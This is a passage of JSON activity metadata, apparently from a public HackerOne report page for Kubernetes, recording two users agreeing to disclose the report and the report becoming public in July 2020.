class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-07-15T21:29:15.145Z","updated_at":"2020-07-15T21:29:15.145Z","actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8667975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-21T19:17:17.436Z","updated_at":"2020-07-21T19:17:17.436Z","first_to_agree":true,"actor":{"username":"tallclair","cleared":false,"url":"/tallclair","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/418/594/6bbb78252759e1d1c1d67be48b7d7470926730de_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8672952,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-22T01:34:00.896Z","updated_at":"2020-07-22T01:34:00.896Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8672953,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-22T01:34:00.961Z","updated_at":"2020-07-22T01:34:00.961Z","actor":{"username":"kebe","cleared":false,"url":"/kebe","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}